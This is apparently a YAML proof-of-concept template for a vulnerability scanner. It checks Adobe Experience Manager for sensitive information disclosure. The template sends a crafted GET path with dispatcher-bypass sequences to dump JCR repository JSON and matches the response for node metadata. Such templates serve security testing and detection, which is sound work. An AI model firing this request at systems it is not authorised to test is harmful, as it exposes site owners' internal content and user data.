id: poc-yaml-aem-secrets-sensitive-information-disclosure
info:
  name: Adobe Experience Manager formsanddocuments.form.validator.html 敏感信息泄露漏洞
  severity: high
  tags:
  - 信息泄露
  - 两高一弱
  finger: experience_manager
variables:
  url: '/content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json

    ..;//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json'
requests:
- method: GET
  path: /{{.url}}
  headers:
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Language: en-US,en;q=0.9,hi;q=0.8
  expression: status_code == 200 && contains(body,"jcr:uuid") && contains(body,"jcr:createdBy")
    && contains(body,"uri") && contains(headers,"application/json")
transport: http
